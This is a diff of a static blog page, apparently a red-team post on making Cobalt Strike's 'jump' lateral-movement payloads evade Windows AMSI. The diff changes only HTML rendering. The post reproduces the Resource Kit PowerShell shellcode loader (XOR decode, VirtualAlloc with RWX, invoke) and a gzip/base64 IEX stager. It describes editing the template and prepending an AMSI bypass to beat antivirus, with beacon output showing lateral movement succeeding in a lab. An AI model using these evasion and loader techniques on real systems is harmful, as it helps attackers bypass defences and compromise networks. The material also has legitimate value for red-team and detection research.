@@ -3,7 +3,7 @@
   <head>
     <title>Making AMSI Jump - Offensive Defence</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
@@ -20,8 +20,8 @@ One set of workflows that amsi_disable does not apply to, are the new (as of 4."
 One set of workflows that amsi_disable does not apply to, are the new (as of 4." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://offensivedefence.co.uk/posts/making-amsi-jump/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2020-06-16T10:52:27&#43;01:00" />
-<meta property="article:modified_time" content="2020-06-16T10:52:27&#43;01:00" />
+<meta property="article:published_time" content="2020-06-16T10:52:27+01:00" />
+<meta property="article:modified_time" content="2020-06-16T10:52:27+01:00" />
 
 
 
@@ -64,7 +64,7 @@ One set of workflows that amsi_disable does not apply to, are the new (as of 4."
     <div class="post-content">
       <p>Since 3.13, Cobalt Strike has had a Malleable C2 option called <code>amsi_disable</code>.  This directive tells Beacon to patch the <code>AmsiScanBuffer</code> function in the host process prior to injecting post-ex capabilities such as <code>powerpick</code> and <code>execute-assembly</code>.  This limits AMSI&rsquo;s visibility of said process and (hopefully) prevents the PowerShell / .NET assemblies being executed from being scanned.</p>
 <p>One set of workflows that <code>amsi_disable</code> does not apply to, are the new (as of 4.0) <code>jump</code> commands.</p>
-<pre><code>beacon&gt; help jump
+<pre tabindex="0"><code>beacon&gt; help jump
 Use: jump [exploit] [target] [listener]
 
 Attempt to spawn a session on a remote target with the specified exploit.
@@ -91,88 +91,88 @@ Beacon Remote Exploits
 <h2 id="resource-kit--amsitrigger">Resource Kit &amp; AMSITrigger</h2>
 <p>The default PowerShell templates used to generate these payloads can be overridden using the <a href="https://www.cobaltstrike.com/scripts">Resource Kit</a>.  Within this package, we have <code>resources.cna</code>, <code>template.x86.ps1</code>, <code>template.x64.ps1</code> and <code>compress.ps1</code>.</p>
 <p>Within these templates, there are lines such as</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;%%DATA%%&#39;)
-</code></pre></div><p>where <code>%%DATA%%</code> is simply a placeholder for the actual Beacon payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;%%DATA%%&#39;)
+</span></span></code></pre></div><p>where <code>%%DATA%%</code> is simply a placeholder for the actual Beacon payload.</p>
 <p>First off, we can use a tool such as <a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> to see if any detections are triggered from the templates themselves.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">D:\Tools\AMSITrigger\AMSITrigger\bin\Debug&gt;AmsiTrigger.exe -i D:\Tools\cobaltstrike\resourcekit\template.x64.ps1 -f 2
-[23]    &#34;If ([IntPtr]::size -eq 8) {
-        [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;%%DATA%%&#39;)
-
-        for ($x = 0; $x -lt $var_code.Count; $x++) {
-                $var_code[$x] = $var_code[$x] -bxor 35
-        }
-
-        $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
-        $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
-        [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
-
-        $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
-        $var_runme.Invoke([IntPtr]::Zero&#34;
-</code></pre></div><p>The general methodology here is to make modifications to the code being highlighted as malicious and re-scanning with AMSITrigger.  I was able to circumvent by simply adding <code>else { return }</code> to the end of the <code>If ([IntPtr]::size -eq 8)</code> block <code>¯\_(ツ)_/¯</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>D:\Tools\AMSITrigger\AMSITrigger\bin\Debug&gt;AmsiTrigger.exe -i D:\Tools\cobaltstrike\resourcekit\template.x64.ps1 -f 2
+</span></span><span style="display:flex;"><span>[23]    &#34;If ([IntPtr]::size -eq 8) {
+</span></span><span style="display:flex;"><span>        [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;%%DATA%%&#39;)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        for ($x = 0; $x -lt $var_code.Count; $x++) {
+</span></span><span style="display:flex;"><span>                $var_code[$x] = $var_code[$x] -bxor 35
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+</span></span><span style="display:flex;"><span>        $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+</span></span><span style="display:flex;"><span>        [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+</span></span><span style="display:flex;"><span>        $var_runme.Invoke([IntPtr]::Zero&#34;
+</span></span></code></pre></div><p>The general methodology here is to make modifications to the code being highlighted as malicious and re-scanning with AMSITrigger.  I was able to circumvent by simply adding <code>else { return }</code> to the end of the <code>If ([IntPtr]::size -eq 8)</code> block <code>¯\_(ツ)_/¯</code>.</p>
 <p>Now if we load <code>resources.cna</code> into the Cobalt Strike Script Manager, and try <code>jump winrm64</code> again&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">beacon&gt; jump winrm64 WIN-CJ8120QPH84 tcp
-[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
-[+] host called home, sent: 219563 bytes
-[+] established link to child beacon: 192.168.152.128
-</code></pre></div><p>Repeat the same process with <code>template.x86.ps1</code> and we can have <code>jump winrm</code> working as well.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">beacon&gt; jump winrm WIN-CJ8120QPH84 tcp
-[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
-[+] host called home, sent: 195283 bytes
-[+] established link to child beacon: 192.168.152.128
-</code></pre></div><h2 id="the-compression-problem">The Compression Problem</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>beacon&gt; jump winrm64 WIN-CJ8120QPH84 tcp
+</span></span><span style="display:flex;"><span>[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
+</span></span><span style="display:flex;"><span>[+] host called home, sent: 219563 bytes
+</span></span><span style="display:flex;"><span>[+] established link to child beacon: 192.168.152.128
+</span></span></code></pre></div><p>Repeat the same process with <code>template.x86.ps1</code> and we can have <code>jump winrm</code> working as well.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>beacon&gt; jump winrm WIN-CJ8120QPH84 tcp
+</span></span><span style="display:flex;"><span>[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via WinRM
+</span></span><span style="display:flex;"><span>[+] host called home, sent: 195283 bytes
+</span></span><span style="display:flex;"><span>[+] established link to child beacon: 192.168.152.128
+</span></span></code></pre></div><h2 id="the-compression-problem">The Compression Problem</h2>
 <p>Even though <code>psexec_psh</code> also uses <code>template.x86.ps1</code>, it was still failing.  By enabling PowerShell Transcript logging on the test target, I was able to see what was happening.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Windows PowerShell transcript start
-Start time: 20200616135045
-Username: TESTLAB\SYSTEM
-RunAs User: TESTLAB\SYSTEM
-Machine: WIN-CJ8120QPH84 (Microsoft Windows NT 10.0.14393.0)
-Host Application: powershell -nop -w hidden -enc JABz[...snip...]ADsA
-**********************
-PS&gt;$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sI[...snip...]CwAA&#34;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
-At line:1 char:1
-+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-At line:1 char:1
-+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus
-software.
-    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordEx
-   ception
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
-</code></pre></div><p>It seems that AMSI has a real issue with base64 decoding and decompressing a GZIP compressed binary - regardless of the actual binary itself.  We can verify this by using <code>cmd.exe</code> as a test candidate.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS &gt; $cmdBytes = [System.IO.File]::ReadAllBytes(&#34;C:\Windows\System32\cmd.exe&#34;)
-PS &gt; [System.IO.MemoryStream] $ms = New-Object System.IO.MemoryStream
-PS &gt; $gs = New-Object System.IO.Compression.GzipStream $ms, ([IO.Compression.CompressionMode]::Compress)
-PS &gt; $gs.Write($cmdBytes, 0, $cmdBytes.Length)
-PS &gt; $gs.Close(); $ms.Close()
-PS &gt; [System.Convert]::ToBase64String($ms.ToArray()) | clip
-</code></pre></div><p>Now if we try to decode and decompress&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users\Daniel&gt; $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sI[...snip...]AA==&#34;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
-
-At line:1 char:1
-+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
-</code></pre></div><p>My first thoughts for trying to get around this was to modify <code>compress.ps1</code> and transform the data in a different way or find a different compression method.  Whilst experimenting, I actually made syntactic error near the top of the script and saw PowerShell errors being spat out in the transcript log, prior to the actual AMSI error being thrown.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">**********************
-PS&gt;CommandInvocation(Out-String): &#34;Out-String&#34;
-&gt;&gt; ParameterBinding(Out-String): name=&#34;InputObject&#34;; value=&#34;The term &#39;some-garbage&#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.&#34;
-some-garbage : The term &#39;some-garbage&#39; is not recognized as the name of a cmdlet, function, script file, or operable 
-program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
-At line:1 char:1
-+ some-garbage;
-</code></pre></div><p>This showed that I have code execution prior to the Beacon payload being decoded, so I placed a custom version of my <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1">old AMSI bypass</a> at the very top of <code>compress.ps1</code> which seemed to do the trick.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">beacon&gt; jump psexec_psh WIN-CJ8120QPH84 tcp
-[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via Service Control Manager (PSH)
-[+] host called home, sent: 210319 bytes
-[+] received output:
-Started service f718f3b on WIN-CJ8120QPH84
-[+] established link to child beacon: 192.168.152.128
-</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Windows PowerShell transcript start
+</span></span><span style="display:flex;"><span>Start time: 20200616135045
+</span></span><span style="display:flex;"><span>Username: TESTLAB\SYSTEM
+</span></span><span style="display:flex;"><span>RunAs User: TESTLAB\SYSTEM
+</span></span><span style="display:flex;"><span>Machine: WIN-CJ8120QPH84 (Microsoft Windows NT 10.0.14393.0)
+</span></span><span style="display:flex;"><span>Host Application: powershell -nop -w hidden -enc JABz[...snip...]ADsA
+</span></span><span style="display:flex;"><span>**********************
+</span></span><span style="display:flex;"><span>PS&gt;$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sI[...snip...]CwAA&#34;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>This script contains malicious content and has been blocked by your antivirus software.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>This script contains malicious content and has been blocked by your antivirus
+</span></span><span style="display:flex;"><span>software.
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordEx
+</span></span><span style="display:flex;"><span>   ception
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</span></span></code></pre></div><p>It seems that AMSI has a real issue with base64 decoding and decompressing a GZIP compressed binary - regardless of the actual binary itself.  We can verify this by using <code>cmd.exe</code> as a test candidate.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS &gt; $cmdBytes = [System.IO.File]::ReadAllBytes(&#34;C:\Windows\System32\cmd.exe&#34;)
+</span></span><span style="display:flex;"><span>PS &gt; [System.IO.MemoryStream] $ms = New-Object System.IO.MemoryStream
+</span></span><span style="display:flex;"><span>PS &gt; $gs = New-Object System.IO.Compression.GzipStream $ms, ([IO.Compression.CompressionMode]::Compress)
+</span></span><span style="display:flex;"><span>PS &gt; $gs.Write($cmdBytes, 0, $cmdBytes.Length)
+</span></span><span style="display:flex;"><span>PS &gt; $gs.Close(); $ms.Close()
+</span></span><span style="display:flex;"><span>PS &gt; [System.Convert]::ToBase64String($ms.ToArray()) | clip
+</span></span></code></pre></div><p>Now if we try to decode and decompress&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PS C:\Users\Daniel&gt; $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sI[...snip...]AA==&#34;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#34;H4sIAAAAA ...
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>This script contains malicious content and has been blocked by your antivirus software.
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+</span></span></code></pre></div><p>My first thoughts for trying to get around this was to modify <code>compress.ps1</code> and transform the data in a different way or find a different compression method.  Whilst experimenting, I actually made syntactic error near the top of the script and saw PowerShell errors being spat out in the transcript log, prior to the actual AMSI error being thrown.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>**********************
+</span></span><span style="display:flex;"><span>PS&gt;CommandInvocation(Out-String): &#34;Out-String&#34;
+</span></span><span style="display:flex;"><span>&gt;&gt; ParameterBinding(Out-String): name=&#34;InputObject&#34;; value=&#34;The term &#39;some-garbage&#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.&#34;
+</span></span><span style="display:flex;"><span>some-garbage : The term &#39;some-garbage&#39; is not recognized as the name of a cmdlet, function, script file, or operable 
+</span></span><span style="display:flex;"><span>program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ some-garbage;
+</span></span></code></pre></div><p>This showed that I have code execution prior to the Beacon payload being decoded, so I placed a custom version of my <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass.ps1">old AMSI bypass</a> at the very top of <code>compress.ps1</code> which seemed to do the trick.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>beacon&gt; jump psexec_psh WIN-CJ8120QPH84 tcp
+</span></span><span style="display:flex;"><span>[*] Tasked beacon to run windows/beacon_bind_tcp (0.0.0.0:4444) on WIN-CJ8120QPH84 via Service Control Manager (PSH)
+</span></span><span style="display:flex;"><span>[+] host called home, sent: 210319 bytes
+</span></span><span style="display:flex;"><span>[+] received output:
+</span></span><span style="display:flex;"><span>Started service f718f3b on WIN-CJ8120QPH84
+</span></span><span style="display:flex;"><span>[+] established link to child beacon: 192.168.152.128
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>The flexibility provided by the Resource Kit allows you to transform Cobalt Strike&rsquo;s artifacts in practically anyway you may choose and it just goes to show how little effort you sometimes have to put in to achieve quite decent results.</p>
 
     </div>
